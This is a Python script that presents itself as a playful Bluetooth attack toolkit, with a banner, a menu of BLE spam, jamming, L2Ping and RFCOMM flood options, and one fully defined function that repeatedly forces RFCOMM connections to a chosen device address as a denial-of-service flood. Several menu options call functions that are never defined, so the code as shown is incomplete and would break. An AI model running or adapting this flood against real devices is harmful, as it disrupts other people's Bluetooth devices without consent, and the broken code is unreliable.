import os
import sys
import time
import random
import subprocess
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, ADDR_TYPE_RANDOM, BTLEException

# 🎨 Spam Jam & Party Pooper Banner
def print_banner():
    print(r"""
███████╗██████╗  █████╗ ███╗   ███╗         ██╗ █████╗ ███╗   ███╗
██╔════╝██╔══██╗██╔══██╗████╗ ████║         ██║██╔══██╗████╗ ████║
███████╗██████╔╝███████║██╔████╔██║         ██║███████║██╔████╔██║
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██   ██║██╔══██║██║╚██╔╝██║
███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚█████╔╝██║  ██║██║ ╚═╝ ██║
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ 
   ❤️💜 A WORLD OF BLE FUN 💜❤️
   👩‍💻 Author: ekoms savior
   🎯 Now with MORE Custom Attacks! 🎉
   """)
    print("💜 XOXO HACK THE PLANET! 💜\n")

# 🎯 RFCOMM Connection Flood (FIXED!)
def rfcomm_flood():
    """Flood a Bluetooth device with RFCOMM connection attempts."""
    addr = input("💜 Enter Bluetooth Device Address for RFCOMM Flood: ")

    if not addr:
        print("⚠️ No address entered. Exiting RFCOMM flood.")
        return

    try:
        duration = int(input("💜 Enter flood duration in seconds (default 30): ") or "30")
    except ValueError:
        print("⚠️ Invalid input! Using default duration of 30 seconds.")
        duration = 30  # Default duration

    print(f"💥 Starting RFCOMM connection flood on {addr} for {duration} seconds...")

    start_time = time.time()
    attempt = 0

    while time.time() - start_time < duration:
        try:
            attempt += 1
            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True, timeout=10)  # Increased timeout!
            print(f"✅ Attempt {attempt}: Connected to {addr}")
        except subprocess.TimeoutExpired:
            print(f"⚠️ Attempt {attempt}: Connection timed out to {addr}, skipping...")
        except subprocess.CalledProcessError:
            print(f"⚠️ Attempt {attempt}: Connection failed to {addr}")
        except KeyboardInterrupt:
            print("⚠️ Stopped by user. Exiting RFCOMM flood.")
            break

    print("✅ RFCOMM flood completed!")

# 🏁 Main Function: Choose Feature
def main():
    print_banner()
    print("🔹 1️⃣ Spam a BLE device 💌")
    print("🔹 2️⃣ Jam a BLE device 🚫")
    print("🔹 3️⃣ Scan for Bluetooth devices 📡")
    print("🔹 4️⃣ L2Ping Attack 💥 (Now customizable!)")
    print("🔹 5️⃣ RFCOMM Connection Flood 💥 (FIXED!)")
    print("🔹 6️⃣ Start Bluetooth Service 📡")
    print("🔹 7️⃣ Quit 🚪")

    choice = input("💜 Choose an option (1-7): ")
    
    if choice == "1":
        target_mac = input("💜 Enter target BLE MAC address: ")
        spam_ble(target_mac)
    elif choice == "2":
        jam_ble()
    elif choice == "3":
        scan_bluetooth()
    elif choice == "4":
        l2ping_attack()
    elif choice == "5":
        rfcomm_flood()  # ✅ Now properly defined & called!
    elif choice == "6":
        start_bluetooth()
    elif choice == "7":
        print("👋 Goodbye, fren! XOXOXO 💜")
        sys.exit()
    else:
        print("⚠️ Invalid choice. Try again! 💜")

if __name__ == "__main__":
    main()
